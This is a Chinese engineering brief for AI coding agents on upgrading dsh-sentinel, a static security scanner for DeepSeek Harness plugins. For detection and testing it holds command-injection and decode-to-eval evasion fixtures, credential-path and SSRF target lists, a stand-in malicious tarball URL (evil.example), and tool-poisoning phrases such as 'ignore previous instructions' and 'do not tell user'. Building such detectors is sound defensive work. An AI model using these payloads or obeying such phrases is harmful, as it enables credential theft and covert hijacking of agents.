# dsh-sentinel 专业级安全扫描器升级任务说明（供 AI 直接修改仓库）

> 目标：把当前 `dsh-sentinel / deepseek-harness-sentinel` 从“基于正则的 DSH 插件静态体检工具”升级为更接近专业级的 **DeepSeek Harness 插件供应链 + Agent Tool 静态安全审计器**。
>
> 本文不是产品宣传稿，而是一份 **可直接交给其他 AI / Coding Agent 执行仓库修改的工程任务书**。
>
> **重要原则：先完整遍历并理解当前仓库，再修改。不要脱离现有项目结构重写整个项目。优先兼容现有 CLI、Harness 插件入口、JSON 报告结构和规则体系。**

---

# 1. 当前项目背景

当前项目名称：

- GitHub 项目：`dsh-sentinel`
- npm 包：`deepseek-harness-sentinel`
- 当前版本：`0.1.0`

当前定位：

- 面向 DeepSeek Harness / DSH 第三方插件
- 只读静态扫描
- 不执行被扫描插件代码
- 可作为独立 CLI 使用
- 可作为 Harness 工具插件使用
- 可扫描单个目录/插件仓库
- 可扫描 DSH profile 中的第三方插件

当前主要代码：

```text
bin/
  sentinel.mjs

engine/
  index.js
  manifest.js
  report.js
  rules.js
  scanner.js

plugin/
  index.js

scripts/
  demo.mjs
  fetch-corpus.mjs
  fetch-corpus-npm.mjs
  generate-ecosystem-doc.mjs
  generate-rules-doc.mjs
  scan-corpus.mjs

docs/
  ecosystem-scan.md
  example-report.json
  roadmap.md
  rules.md
  submission-awesome.md
```

当前扫描能力大致包括：

- 远程代码下载后执行
- shell / child_process 执行
- eval / Function / vm 动态执行
- 凭据文件读取
- 环境变量中的 token / secret
- 硬编码密钥
- `.env` 加载
- 凭据文件写入
- 可疑外传端点
- 网络请求携带凭据
- 编码后的凭据外传
- base64 / hex / 长字符串混淆
- 压缩单行代码
- install 生命周期脚本
- install 阶段网络下载执行
- 危险删除
- 工作区外写文件
- chmod / sudo / setuid 等权限修改
- 临时目录执行
- 网络连接
- 公网 IP
- DSH bundle manifest
- `cordis.patch.yml`
- 插件入口导出
- license / description 基础 hygiene

当前规则引擎约有 31 条启发式规则，类别包括：

```text
execution
credentials
exfiltration
obfuscation
install
filesystem
network
manifest
hygiene
```

---

# 2. 核心升级目标

不要单纯继续堆更多正则。

这次升级的核心是把项目从：

> “关键字/正则安全扫描器”

升级成：

> **“DSH 插件安装前供应链安全审计 + Harness Agent Tool 语义安全分析器”**

理想架构：

```text
                    dsh-sentinel Professional

            ┌────────────────────────────┐
            │  0. Package Acquisition     │
            │ npm tarball / local repo    │
            │ 不执行 install scripts       │
            │ hash / integrity / metadata │
            └─────────────┬──────────────┘
                          ↓
            ┌────────────────────────────┐
            │  1. Supply-chain Analysis   │
            │ package.json / lockfiles    │
            │ deps / scripts / provenance │
            └─────────────┬──────────────┘
                          ↓
            ┌────────────────────────────┐
            │  2. Fast Heuristic Engine   │
            │ 现有 regex 规则快速扫描       │
            └─────────────┬──────────────┘
                          ↓
            ┌────────────────────────────┐
            │  3. Semantic Engine         │
            │ AST / data flow / taint     │
            │ source → propagation → sink │
            └─────────────┬──────────────┘
                          ↓
            ┌────────────────────────────┐
            │  4. Harness-Specific Rules  │
            │ Tool args → shell/fs/net    │
            │ prompt/tool poisoning       │
            │ workspace/memory exfil      │
            └─────────────┬──────────────┘
                          ↓
            ┌────────────────────────────┐
            │  5. Policy + Evidence       │
            │ severity / confidence       │
            │ reachability / attack chain │
            │ JSON / SARIF / HTML         │
            └────────────────────────────┘
```

---

# 3. 必须保持的项目红线

修改时必须遵守：

## 3.1 不执行被扫描代码

任何情况下都不能：

```js
require(targetPlugin)
import(targetPlugin)
eval(targetCode)
new Function(targetCode)
spawn(targetPlugin)
exec(targetPlugin)
```

扫描器只能读取：

- 文件
- manifest
- lockfile
- tarball 内容
- 静态源码
- metadata

---

## 3.2 默认不上传用户源码

保持：

- 本地扫描
- 源码不上传
- 不把插件代码发送到第三方服务器

如果未来支持 CVE / OSV / threat intelligence：

只允许上传类似：

```text
package name
package version
hash
ecosystem
```

不要上传源码内容。

---

## 3.3 不把“命中”直接等价成“恶意”

当前项目这一原则必须保留：

> heuristic finding ≠ malicious verdict

报告应体现：

```text
finding
severity
confidence
evidence
reachability
recommendation
```

最终是风险审计，不是武断地下结论。

---

# 4. P0：必须优先修复的现有问题

以下属于当前扫描器的结构性问题，优先于 HTML 报告、UI 美化等功能。

---

# 4.1 修复 maxFindings 导致“提前停止扫描”的完整性问题

当前 `engine/scanner.js` 的逻辑在 findings 达到上限后会停止继续扫描后面的文件。

问题：

```text
maxFindings = 300
↓
前面若已经命中 300 条
↓
后续文件不再扫描
↓
但 filesScanned 仍可能看起来像全部文件都参与扫描
```

这对安全工具非常危险。

## 修改要求

### findings 数量限制只限制“报告保存条数”

不能限制：

```text
实际分析的文件数量
```

即：

```js
analysis continues
report findings are capped
```

建议：

```js
allFindingCount++
if (storedFindings.length < maxFindings) {
  storedFindings.push(finding)
}
```

不能：

```js
if (findings.length >= maxFindings) break
```

---

## 报告新增字段

建议：

```json
{
  "summary": {
    "scanComplete": true,
    "filesDiscovered": 1200,
    "filesAnalyzed": 1200,
    "findingsTotal": 863,
    "findingsReturned": 300,
    "findingsTruncated": true
  }
}
```

如果因为：

- `maxFiles`
- 文件太大
- 权限错误
- 解析失败

导致无法完整扫描：

```json
"scanComplete": false
```

---

# 4.2 不要默认跳过 dist / build

当前 scanner 的跳过目录包含类似：

```text
dist
build
out
```

这对源码仓库扫描可能合理。

但对 npm package / 已安装插件扫描是严重盲区。

很多 npm 包真正执行的代码就是：

```text
dist/index.js
lib/index.js
build/index.js
```

甚至源码根本没有发布。

---

## 修改为扫描模式

引入：

```text
source mode
package mode
profile mode
```

### source mode

适合 GitHub 源码仓库：

可以：

- 扫 `src`
- 扫入口
- 对 dist/build 降权或可选跳过

### package mode

适合：

```text
npm tarball
已安装 node_modules
```

必须扫描：

```text
dist
build
lib
out
bundle
```

因为这里才是实际执行产物。

### profile mode

必须以“实际安装后会执行的文件”为优先。

---

# 4.3 大文件不能简单跳过

当前大于约 512 KB 文件会被跳过。

攻击代码非常可能藏在：

```text
bundle.js
vendor.js
minified.js
generated.js
```

因此不能直接跳过。

---

## 新策略

例如：

### 小文件

```text
< 512 KB
```

完整扫描。

### 中等文件

```text
512 KB - 5 MB
```

仍完整扫描，但可：

- 限制 regex 次数
- 流式读取
- 分块扫描

### 超大文件

```text
> 5 MB
```

至少：

- 文件 hash
- entropy
- 超长行
- URL
- eval
- Function
- child_process
- base64 blob
- secret pattern
- suspicious strings

报告：

```json
{
  "analysisMode": "large-file-lite"
}
```

不能只是：

```text
big skipped
```

---

# 4.4 增加扫描路径 containment

当前所有来自：

```text
package.json
cordis.patch.yml
exports
main
patch entry
```

的路径都必须视为不可信。

攻击者可能构造：

```text
../../../../Users/xxx/.ssh/id_rsa
```

扫描器不能因此读取目标目录之外的文件。

---

## 建议新增

```text
engine/path-safety.js
```

提供：

```js
resolveInside(root, candidate)
isInsideRoot(root, candidate)
safeRealpath(root, candidate)
```

核心逻辑：

```js
const rootReal = realpath(root)
const candidateReal = realpath(candidate)

if (
  candidateReal !== rootReal &&
  !candidateReal.startsWith(rootReal + path.sep)
) {
  throw new PathEscapeError()
}
```

以下地方都必须走 containment：

- `dsh.bundle.patch`
- patch module name
- package exports
- package main
- 任何静态 manifest 路径

新增 finding：

```text
SEN-MAN-009 path-escape
severity: critical/high
```

---

# 4.5 修复 hasExportContract

当前插件入口检查过于宽松。

真正的 Cordis / DSH 插件入口至少应该验证：

```text
name
apply
```

而不是：

```text
有 name 或 apply 任意一个即可
```

---

## 短期实现

如果暂时还没有 AST：

分别判断：

```js
hasNameExport
hasApplyExport
```

必须：

```js
hasNameExport && hasApplyExport
```

CommonJS 也不能：

```js
只要 module.exports 存在就认为合法
```

应该进一步检测对象内容。

---

## AST 完成后

该逻辑迁移到 semantic engine。

---

# 4.6 Secret 必须脱敏

当前 finding 的 `snippet` 可能完整保留：

```text
sk-xxxxxxxx
ghp_xxxxxxxx
JWT
AWS key
```

这意味着扫描器可能：

```text
发现 secret
↓
把 secret 原样写进 JSON / CI 日志
↓
造成二次泄露
```

---

## 新增

```text
engine/redact.js
```

例如：

```js
redactSecrets(text)
```

输出：

```text
sk-proj-1234************abcd
ghp_abcd************xyz
AKIA************1234
```

---

## finding 新字段

```json
{
  "snippet": "const key = 'sk-abc********xyz'",
  "secretFingerprint": "sha256:xxxx",
  "redacted": true
}
```

永远不要把完整 secret 放进报告。

---

# 4.7 报告中的本机绝对路径匿名化

当前报告 target.path 可能类似：

```text
C:\Users\Administrator\Desktop\code\...
```

公开分享报告时可能泄露用户名与本机目录。

增加：

```text
--redact-paths
```

或默认在可分享输出里：

```text
<workspace>/plugin
```

CLI 本地 verbose 模式可以保留真实路径。

---

# 5. P0：安装前扫描保护

这是项目升级为“保护器”的关键。

当前 profile scan 大多属于：

```text
插件已经装进 node_modules
↓
再扫描
```

但恶意 npm 包可能在：

```text
preinstall
install
postinstall
prepare
```

阶段已经执行攻击。

---

# 5.1 新增 package acquisition

建议新增：

```text
engine/package/
  acquire.js
  tarball.js
  metadata.js
```

支持：

```text
dsh-sentinel npm:<package>
dsh-sentinel npm:<package>@<version>
```

例如：

```bash
dsh-sentinel npm:dsh-example
dsh-sentinel npm:dsh-example@1.2.3
```

获取 npm tarball 时必须：

```text
下载
解压到临时 quarantine 目录
不运行 npm install
不运行生命周期脚本
```

然后扫描。

---

# 5.2 新增 install audit 模式

建议 CLI：

```bash
dsh-sentinel audit-install deepseek-harness-xxx
```

流程：

```text
npm metadata
↓
tarball
↓
integrity check
↓
静态扫描
↓
依赖扫描
↓
manifest 扫描
↓
风险判定
↓
生成 install audit report
```

输出：

```text
ALLOW
REVIEW
BLOCK-RECOMMENDED
```

注意：

不要自动说：

```text
malicious
```

---

# 5.3 为未来 DSH 安装钩子预留接口

未来如果能和：

```text
dsh plugin add
```

集成，理想流程：

```text
dsh plugin add foo
↓
sentinel pre-install audit
↓
safe/review
↓
用户确认
↓
真正安装
```

不要强行 patch DSH 内部逻辑。

先设计可复用 API：

```js
auditPackageBeforeInstall(spec, opts)
```

---

# 6. P0/P1：AST + 语义分析

这是专业级扫描器的核心。

现有正则规则保留。

不要删除。

结构应变成：

```text
regex fast pass
+
semantic deep pass
```

---

# 6.1 建议新增目录

```text
engine/semantic/
  parser.js
  ast.js
  symbols.js
  imports.js
  dataflow.js
  taint.js
  harness.js
```

---

# 6.2 第一阶段支持语言

优先：

```text
JavaScript
MJS
CJS
TypeScript
TSX
JSX
```

不要第一版同时做 Python / Go / Rust 全语义。

其他语言继续用现有 regex。

---

# 6.3 AST parser

允许增加少量高质量依赖。

“零依赖”不是安全工具必须坚持的核心价值。

如果为了 AST 需要依赖：

```text
@babel/parser
acorn
meriyah
typescript
```

选择一个成熟 parser。

重点是：

```text
正确率 > 零依赖营销点
```

---

# 6.4 Source / Sink 模型

建立 taint source。

## Harness sources

重点识别：

```js
defineTool({
  parameters: {...},
  async execute(args) {
  }
})
```

其中：

```text
args.*
```

属于：

```text
model-controlled input
```

这是 DSH 专属能力。

例如：

```js
args.command
args.path
args.url
args.query
args.content
```

---

## 通用 sources

包括：

```text
process.env
process.argv
request body
query params
WebSocket message
stdin
plugin config
conversation content
workspace file content
memory content
```

---

## sinks

### Command execution

```text
exec
execSync
spawn
spawnSync
execFile
fork
shell=true
system
popen
```

### Dynamic code

```text
eval
Function
vm.runIn*
Module._compile
dynamic import from untrusted path
```

### Filesystem

```text
readFile
writeFile
rm
unlink
rename
chmod
chown
mkdir
```

尤其关注：

```text
工作区之外
用户 HOME
.ssh
.aws
.npmrc
.kube
.docker
```

### Network

```text
fetch
axios
http.request
https.request
WebSocket
sendBeacon
net.connect
dgram
```

### Persistence

```text
startup
scheduled task
registry
cron
shell profile
service installation
```

---

# 6.5 第一批必须实现的 taint 规则

---

## SEN-TAINT-001

```text
model-input-to-shell
```

例：

```js
execute(args) {
  exec(args.command)
}
```

severity：

```text
critical
```

---

## SEN-TAINT-002

```text
model-input-to-path
```

例如：

```js
readFile(args.path)
```

如果没有 workspace containment：

```text
high
```

如果：

```text
args.path → ../../.ssh/id_rsa
```

应升级 critical。

---

## SEN-TAINT-003

```text
model-input-to-network
```

例如：

```js
fetch(args.url)
```

这是 SSRF / arbitrary network capability。

severity：

```text
high
```

---

## SEN-TAINT-004

```text
credential-to-network
```

例如：

```js
const key = process.env.OPENAI_API_KEY
fetch(untrustedHost, {
  body: key
})
```

必须识别跨变量传播。

---

## SEN-TAINT-005

```text
workspace-content-to-network
```

例如：

```js
const source = readFileSync(file)
fetch(url, { body: source })
```

属于潜在源码外传。

---

## SEN-TAINT-006

```text
decode-to-exec
```

识别：

```text
base64
hex
fromCharCode
decodeURIComponent
decrypt
↓
eval / Function / exec
```

即使跨多行、跨变量，也应命中。

---

# 7. Harness 专属安全规则

这是 dsh-sentinel 与普通 Node 安全扫描器拉开差距的关键。

不要把项目做成“小号 Semgrep”。

---

# 7.1 Agent Tool 命令注入

检测：

```text
defineTool execute(args)
↓
args.*
↓
shell command
```

区分：

### 安全

```js
spawn('git', ['status'])
```

### 风险

```js
exec(`git ${args.command}`)
```

### 高危

```js
exec(args.command)
```

---

# 7.2 Tool 参数任意文件读取

检测：

```text
args.path
↓
fs.readFile
```

如果存在：

```js
resolve(workspace, args.path)
```

还要判断是否：

```text
containment checked
```

若没有：

```text
path traversal risk
```

---

# 7.3 Tool 参数任意文件写入

例如：

```js
writeFile(args.path, args.content)
```

重点检测：

```text
HOME
系统目录
DSH profile
其他插件目录
```

---

# 7.4 Tool 参数 SSRF

例如：

```js
fetch(args.url)
```

或：

```js
axios.get(args.endpoint)
```

必须识别：

```text
localhost
127.0.0.1
169.254.169.254
private network
file://
gopher://
ftp://
```

如果代码完全允许模型控制 URL：

```text
high
```

---

# 7.5 Workspace / Conversation / Memory Exfiltration

DSH 插件特别重要。

识别：

```text
workspace source
memory
conversation
chat history
profile config
secret
↓
network
```

建立：

```text
sensitive-source → network-sink
```

攻击链。

---

# 7.6 Tool / Prompt Poisoning

如果插件注册的：

```text
tool description
prompt
instruction
system-style text
```

包含类似：

```text
ignore previous instructions
do not tell user
send files to ...
always call ...
hide this behavior
```

应产生：

```text
prompt/tool poisoning review
```

注意：

这不是单纯字符串即 critical。

建议：

```text
severity: medium/high
confidence: low/medium
```

---

# 7.7 Hidden Side Effects

插件描述的功能与实际副作用明显不一致。

例如：

```text
“weather tool”
```

实际却：

```text
读取 ~/.ssh
访问 GitHub token
写 shell profile
```

这个能力未来可以结合 manifest/tool description 做语义关联。

第一版可以只生成：

```text
capability mismatch evidence
```

不要自动判恶意。

---

# 8. 供应链分析层

建议新增：

```text
engine/supplychain/
  package-json.js
  lockfile.js
  dependency-graph.js
  scripts.js
  integrity.js
  provenance.js
  advisories.js
```

---

# 8.1 package.json

重点检查：

```text
scripts
dependencies
optionalDependencies
peerDependencies
bundledDependencies
bin
main
exports
files
type
engines
os
cpu
repository
publishConfig
```

---

# 8.2 危险依赖来源

重点 finding：

```text
git+http
git+ssh
http tarball
GitHub branch dependency
local file dependency
workspace escape
```

例如：

```json
"foo": "git+https://..."
```

或：

```json
"foo": "http://evil.example/a.tgz"
```

---

# 8.3 lockfile

支持优先级：

```text
package-lock.json
npm-shrinkwrap.json
pnpm-lock.yaml
yarn.lock
bun.lock / bun.lockb
```

建立 dependency graph：

```text
plugin
├── direct dependency
│   └── transitive dependency
└── direct dependency
```

报告中不要把普通 dependency 当成 DSH plugin。

---

# 8.4 生命周期脚本

不仅检查根 package。

还应检查：

```text
direct dependency
transitive dependency
```

中的：

```text
preinstall
install
postinstall
prepare
```

如果依赖层存在安装脚本：

```text
标注 dependency chain
```

例如：

```text
plugin-a
→ package-b
→ package-c
→ postinstall curl ...
```

---

# 8.5 Integrity

对于 npm tarball：

记录：

```text
name
version
resolved
integrity
tarball sha256
```

报告增加：

```json
"supplyChain": {
  "package": "...",
  "version": "...",
  "tarballSha256": "...",
  "integrity": "...",
  "dependencyCount": 0
}
```

---

# 8.6 Provenance

允许做成：

```text
optional
```

不要因此上传源码。

仅查询：

```text
package metadata
```

---

# 8.7 CVE / OSV

建议：

```text
默认关闭联网
```

CLI：

```bash
--advisories
```

开启后只上传：

```text
package name
version
```

获取：

```text
known vulnerability
malicious package intelligence
```

---

# 9. Profile 扫描逻辑重构

当前不能简单：

```text
node_modules 下面所有包 = DSH plugin
```

必须区分：

```text
DSH direct plugin
plugin dependency
transitive dependency
built-in
scanner self
```

---

# 9.1 Plugin discovery

优先通过：

```text
profile package.json
dsh profile manifest
cordis patch
direct dependency relation
```

确认真正安装的插件。

---

# 9.2 Dependency graph

Profile report 改成：

```json
{
  "plugins": [
    {
      "name": "foo",
      "version": "1.0.0",
      "direct": true,
      "dependencies": 53,
      "findings": 8
    }
  ]
}
```

---

# 9.3 @deepseek-ai 不再永久硬跳过

可以默认：

```text
trustedVendor = true
```

但提供：

```bash
--scan-builtins
```

或 config：

```json
{
  "trustedScopes": ["@deepseek-ai"]
}
```

默认策略可以：

```text
不做深度 AST
但做 hash / manifest / version / provenance / basic scan
```

不要整个 scope 完全不可见。

---

# 10. 风险评分升级

当前简单：

```text
critical = 50
high = 20
medium = 8
low = 3
```

然后相加封顶。

这可以作为 legacy score。

专业版增加：

```text
severity
confidence
reachability
context
chain
```

---

# 10.1 Finding 示例

```json
{
  "id": "SEN-TAINT-001",
  "severity": "critical",
  "confidence": "high",
  "reachability": "reachable",
  "category": "execution",
  "source": {
    "type": "tool-argument",
    "name": "args.command"
  },
  "sink": {
    "type": "shell",
    "callee": "exec"
  },
  "flow": [
    "args.command",
    "cmd",
    "exec(cmd)"
  ],
  "file": "plugin/index.js",
  "line": 82
}
```

---

# 10.2 Attack chain

不要把一条真实攻击链拆成 4 个 findings 然后重复加分。

例如：

```text
process.env.API_KEY
↓
Buffer.from
↓
fetch(untrustedHost)
```

可以形成：

```text
CHAIN-CREDENTIAL-EXFIL
```

其中：

```text
CRED-002
EXFIL-003
NET-001
```

作为 evidence。

主风险只计一次。

---

# 10.3 Confidence

建议：

```text
low
medium
high
```

例如：

### Regex-only

```text
confidence: medium
```

### AST exact call

```text
confidence: high
```

### Taint reachable

```text
confidence: high
```

### Tool poisoning phrase

```text
confidence: low/medium
```

---

# 11. Test 文件降权机制升级

不能仅因为路径是：

```text
test/
tests/
spec/
e2e/
```

就直接降一级。

攻击者可能：

```js
require('./test/helper.js')
```

并从生产入口调用。

---

## 新规则

只有同时满足：

```text
test path
AND
not reachable from production entry
AND
not packaged runtime dependency
```

才降权。

否则：

```text
正常计分
```

---

# 12. Entry / Reachability

建立运行入口集合。

来自：

```text
package.json main
package.json exports
package.json bin
dsh.bundle patch
Cordis plugin entry
install scripts
```

构建：

```text
entry
↓
imports/requires
↓
reachable files/functions
```

报告：

```json
"reachability": "reachable"
```

或：

```json
"reachability": "unreachable"
```

---

# 13. Binary / WASM 处理

目前不能仅按扩展名全部跳过：

```text
.wasm
.node
.exe
.dll
.so
.dylib
```

第一阶段不要求反编译。

但至少要：

```text
hash
magic bytes
file type
size
entropy
printable strings
URL strings
shell strings
credential path strings
suspicious domains
```

finding：

```text
SEN-BIN-001 native-binary-present
SEN-BIN-002 high-entropy-binary
SEN-BIN-003 suspicious-binary-strings
SEN-WASM-001 wasm-module-present
```

这些不应单独判恶意。

---

# 14. 新的规则分类

建议扩展：

```text
execution
credentials
exfiltration
obfuscation
install
filesystem
network
manifest
hygiene

agent
taint
supply-chain
dependency
persistence
binary
integrity
privacy
```

---

# 15. CLI 升级

保留当前：

```bash
dsh-sentinel <path>
dsh-sentinel --profile <name>
dsh-sentinel --rules
```

新增建议：

```bash
dsh-sentinel npm:<package>
dsh-sentinel npm:<package>@<version>

dsh-sentinel audit-install <package>

dsh-sentinel <path> --deep
dsh-sentinel <path> --fast

dsh-sentinel <path> --format json
dsh-sentinel <path> --format sarif
dsh-sentinel <path> --format text

dsh-sentinel <path> --redact-paths
dsh-sentinel <path> --include-builtins
dsh-sentinel <path> --advisories

dsh-sentinel <path> --fail-on high
dsh-sentinel <path> --fail-on critical
```

---

# 16. Config 文件

加入：

```text
sentinel.config.json
```

示例：

```json
{
  "mode": "deep",
  "maxFiles": 10000,
  "maxBytesPerFile": 5242880,
  "trustedScopes": [
    "@deepseek-ai"
  ],
  "ignore": [
    "**/coverage/**"
  ],
  "includeBuildArtifacts": true,
  "redactSecrets": true,
  "redactPaths": true,
  "advisories": false,
  "failOn": "high"
}
```

---

# 17. Ignore 机制

支持：

```bash
--ignore
```

也支持 config。

但安全工具的 ignore 必须进入报告。

例如：

```json
{
  "ignored": [
    {
      "pattern": "**/generated/**",
      "files": 22
    }
  ]
}
```

不要静默忽略。

---

# 18. SARIF

新增：

```text
engine/output/sarif.js
```

支持：

```bash
dsh-sentinel . --format sarif --out sentinel.sarif
```

目标：

以后 GitHub Action 可以上传 Code Scanning。

SARIF finding 应包含：

```text
ruleId
level
message
location
help
fingerprint
```

---

# 19. Finding fingerprint

每个 finding 应生成稳定 fingerprint。

例如：

```text
sha256(
  ruleId +
  normalizedFile +
  normalizedSink +
  normalizedSource
)
```

不要依赖绝对行号作为唯一 fingerprint。

这样代码移动几行不会产生全新 finding。

---

# 20. Baseline / PR 模式

支持：

```bash
dsh-sentinel . --baseline baseline.json
```

报告：

```text
new findings
existing findings
resolved findings
```

这对 CI 非常重要。

---

# 21. HTML 报告

HTML 可以做，但优先级低于扫描正确性。

建议放到：

```text
engine/output/html.js
```

展示：

```text
verdict
score
confidence
attack chains
top findings
dependency tree
files skipped
scan completeness
```

必须明确显示：

```text
Scan complete: YES / NO
```

---

# 22. Benchmark / 测试体系

这是必须新增的核心。

建议：

```text
test/
  fixtures/
    malicious/
    safe/
    evasions/
    harness/
    supply-chain/
    binaries/
```

---

# 22.1 malicious fixtures

包括：

```text
remote-code-download
credential-read
credential-exfil
postinstall-download
path-traversal
model-to-shell
model-to-network
workspace-to-network
persistence
```

---

# 22.2 evasions

专门测试绕过：

### 字符串拼接

```js
cp['ex' + 'ec'](cmd)
```

### 别名

```js
const { exec: run } = require('child_process')
run(cmd)
```

### 多步变量

```js
const a = args.command
const b = a
exec(b)
```

### 跨函数

```js
function run(x) {
  exec(x)
}

run(args.command)
```

### 跨文件

```text
tool.js
→ helper.js
→ exec
```

### computed env

```js
process.env['OPEN' + 'AI_API_KEY']
```

### decode chain

```js
const x = Buffer.from(payload, 'base64').toString()
eval(x)
```

---

# 22.3 Safe fixtures

一定要有真实安全样例。

例如：

```js
spawn('git', ['status'])
```

不能误报成 command injection。

例如：

```js
fetch('https://api.deepseek.com', {
  headers: {
    Authorization: `Bearer ${process.env.DEEPSEEK_API_KEY}`
  }
})
```

不能简单等价：

```text
credential exfiltration
```

应该：

```text
network + credential use
review
trusted endpoint evidence
```

---

# 22.4 Benchmark 指标

至少生成：

```text
true positives
false positives
false negatives
precision
recall
```

可以新增：

```bash
npm run benchmark
```

---

# 23. Corpus 机制升级

当前 ecosystem corpus 很有价值。

但不要只抓部分文件。

优先：

```text
npm pack
```

获取真实发布包。

然后：

```text
scan actual package contents
```

GitHub repo corpus 可以作为第二套：

```text
source corpus
```

最终对比：

```text
Source scan
Published package scan
```

这甚至可以检测：

```text
仓库源码正常
npm 发布包夹带额外代码
```

---

# 24. Source vs Published Package Diff

这是非常有价值的供应链功能。

以后支持：

```text
GitHub source
vs
npm tarball
```

比较：

```text
extra files
missing files
modified runtime files
unexpected binaries
different install scripts
```

finding：

```text
SEN-SUPPLY-001 source-package-drift
```

---

# 25. Manifest 检测改进

除了当前：

```text
dsh.bundle
patch
entry
license
description
```

新增：

```text
main
exports
bin
files
scripts
repository
engines
```

---

# 25.1 cordis.patch.yml

不要长期依赖手写 line parser。

建议：

```text
正式 YAML parser
```

否则复杂 YAML：

```text
quoted string
multiline
anchor
nested object
```

可能被错误解析。

如果增加 parser 依赖是合理的。

---

# 26. 版本信息统一

当前版本号不要在多个文件手工维护。

建立单一来源。

建议：

```js
import pkg from '../package.json' with { type: 'json' }
```

或生成：

```text
engine/version.js
```

CLI / report / plugin 全部引用同一处。

避免：

```text
CLI = 0.2.0
report = 0.1.0
```

---

# 27. 规则文档权重统一

`rules.js` 是唯一真实权重来源。

`generate-rules-doc.mjs` 不允许硬编码：

```text
critical(45)
```

必须读取：

```js
SEVERITY_WEIGHT
```

生成文档。

---

# 28. 报告 schema v2

建议保持现有字段，新增字段，不要大规模破坏兼容。

例如：

```json
{
  "schemaVersion": 2,
  "tool": "dsh-sentinel",
  "version": "0.2.0",

  "summary": {
    "verdict": "review",
    "score": 42,
    "scanComplete": true,
    "filesDiscovered": 210,
    "filesAnalyzed": 210,
    "findingsTotal": 15,
    "findingsReturned": 15,
    "findingsTruncated": false
  },

  "findings": [],

  "attackChains": [],

  "supplyChain": {},

  "stats": {},

  "scanCoverage": {
    "sourceFiles": 100,
    "buildFiles": 60,
    "binaryFiles": 2,
    "largeFiles": 3,
    "parseFailures": 0
  }
}
```

---

# 29. 新 verdict 逻辑

仍保留：

```text
safe
review
risky
dangerous
```

但增加：

```text
confidence summary
```

例如：

```json
{
  "verdict": "risky",
  "score": 68,
  "confidence": "high"
}
```

另外：

如果扫描不完整：

```text
不能显示 clean
```

应该：

```text
review
```

并显示：

```text
INCOMPLETE SCAN
```

---

# 30. “safe” 文案改进

不要出现绝对：

```text
no findings — clean
```

建议：

```text
No findings detected by enabled rules.
```

中文：

```text
当前启用规则未发现问题；这不等价于插件已被证明安全。
```

---

# 31. SECURITY.md

仓库目前应补：

```text
SECURITY.md
```

内容包括：

```text
支持版本
漏洞提交邮箱/渠道
不要公开提交 0-day
响应时间
安全扫描器自身漏洞范围
```

---

# 32. GitHub Action

不要现在先做完整 Action 市场发布。

先保证 CLI：

```text
stable exit code
SARIF
baseline
fail-on
```

完成后再做：

```text
dsh-sentinel-action
```

---

# 33. Exit Code

建议扩展：

```text
0 = below configured threshold
1 = security threshold exceeded
2 = scan/runtime error
3 = incomplete scan
```

如果担心兼容：

默认仍保留：

```text
0 / 1 / 2
```

新增：

```bash
--strict-exit-codes
```

---

# 34. 建议代码结构

升级后可以逐步演进成：

```text
engine/
  index.js

  scan/
    tree.js
    file.js
    mode.js

  rules/
    heuristic.js
    catalog.js

  semantic/
    parser.js
    imports.js
    dataflow.js
    taint.js
    harness.js

  supplychain/
    package-json.js
    lockfile.js
    dependency-graph.js
    tarball.js
    integrity.js
    advisories.js

  security/
    path-safety.js
    redact.js

  manifest/
    dsh.js
    patch.js

  report/
    build.js
    score.js
    fingerprint.js

  output/
    text.js
    json.js
    sarif.js
    html.js
```

不要一次性移动全部代码导致巨大 diff。

建议：

```text
先新增模块
↓
旧模块委托新模块
↓
测试稳定
↓
再拆目录
```

---

# 35. 推荐实施顺序

严格按顺序推进。

---

## Phase 1：正确性修复

必须先完成：

- [ ] maxFindings 不再停止扫描
- [ ] scanComplete / coverage
- [ ] 大文件策略
- [ ] package mode 扫 dist/build
- [ ] path containment
- [ ] hasExportContract 修复
- [ ] secret redaction
- [ ] path redaction
- [ ] version 单一来源
- [ ] rules doc 权重单一来源

---

## Phase 2：扫描目标模型

- [ ] source mode
- [ ] package mode
- [ ] profile mode
- [ ] 真正 DSH plugin discovery
- [ ] dependency graph
- [ ] direct/transitive 区分
- [ ] built-in trust policy

---

## Phase 3：安装前扫描

- [ ] npm tarball acquisition
- [ ] quarantine extraction
- [ ] integrity
- [ ] install script audit
- [ ] audit-install API
- [ ] CLI npm:<pkg>

---

## Phase 4：AST

- [ ] JS/TS parser
- [ ] imports
- [ ] symbols
- [ ] call identification
- [ ] aliases
- [ ] computed property basics

---

## Phase 5：Taint

- [ ] tool args → exec
- [ ] tool args → fs
- [ ] tool args → network
- [ ] credential → network
- [ ] workspace → network
- [ ] decode → exec
- [ ] cross-function flow
- [ ] basic cross-file flow

---

## Phase 6：Harness 专属

- [ ] defineTool recognition
- [ ] model-controlled argument classification
- [ ] path traversal
- [ ] SSRF
- [ ] workspace exfil
- [ ] memory/conversation exfil
- [ ] prompt/tool poisoning
- [ ] side-effect mismatch evidence

---

## Phase 7：CI 专业化

- [ ] fingerprint
- [ ] SARIF
- [ ] baseline
- [ ] fail-on
- [ ] GitHub Action

---

## Phase 8：生态能力

- [ ] OSV 可选
- [ ] provenance
- [ ] package/source diff
- [ ] malicious fingerprint intelligence
- [ ] HTML report
- [ ] public ecosystem benchmark

---

# 36. 第一版不要做的东西

不要为了“专业感”一上来做：

```text
动态执行沙箱
自动上传源码到云端
AI 在线审代码
完整 native binary reverse engineering
全语言 AST
自动认定 malicious
```

这些会让项目失控。

---

# 37. 测试要求

每修改一个安全逻辑，必须同时添加：

```text
positive test
negative test
evasion test
```

例：

## command injection

### positive

```js
exec(args.command)
```

必须命中。

### negative

```js
spawn('git', ['status'])
```

不能命中 critical。

### evasion

```js
const { exec: run } = require('child_process')
const c = args.command
run(c)
```

必须命中。

---

# 38. 性能要求

Fast mode：

```text
主要 regex
manifest
package metadata
```

目标：

```text
普通插件 < 1 秒
```

Deep mode：

```text
regex + AST + taint + dependency
```

允许更慢。

建议：

```bash
--fast
--deep
```

默认可以：

```text
fast + selected semantic checks
```

---

# 39. 兼容要求

必须保持：

```js
scan(target, opts)
scanProfile(profile, opts)
RULES
VERSION
```

尽量兼容。

Harness plugin 当前：

```text
sentinel_scan
sentinel_scan_profile
```

不要直接删除。

可以新增：

```text
sentinel_audit_package
```

---

# 40. Harness Tool 新接口建议

未来：

```text
sentinel_scan
sentinel_scan_profile
sentinel_audit_package
```

其中：

## sentinel_audit_package

参数：

```json
{
  "package": "example@1.0.0",
  "deep": true
}
```

必须：

```text
下载 tarball
静态扫描
不安装
不执行
```

---

# 41. Finding ID 规范

保持：

```text
SEN-<CATEGORY>-NNN
